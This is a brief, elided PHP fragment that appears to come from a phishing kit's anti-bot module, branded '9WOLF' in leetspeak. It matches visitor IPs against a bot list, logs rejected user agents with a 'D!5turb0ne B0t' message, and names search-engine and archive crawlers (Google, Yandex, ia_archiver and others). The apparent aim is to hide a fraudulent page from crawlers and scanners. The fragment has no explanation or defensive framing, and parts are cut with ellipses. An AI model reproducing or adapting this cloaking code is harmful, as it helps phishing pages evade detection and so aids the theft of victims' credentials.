...
if (in_array($WOLFIP, $WOLFBots)) {
    $message =
        "9WOLF D3cl!n3d => 4g3nt: " .
    ...
    foreach ($WOLFBots as $a4ade) {
        if (preg_match('/' . $a4ade . '/', $WOLFIP)) {
            $message =
                "9WOLF D3cl!n3d => 4g3nt: " .
                $_SERVER['HTTP_USER_AGENT'] .
                " [ D!5turb0ne B0t ! ] :\n  || D4t3:" .
...
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $c3d1b = ["Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"];
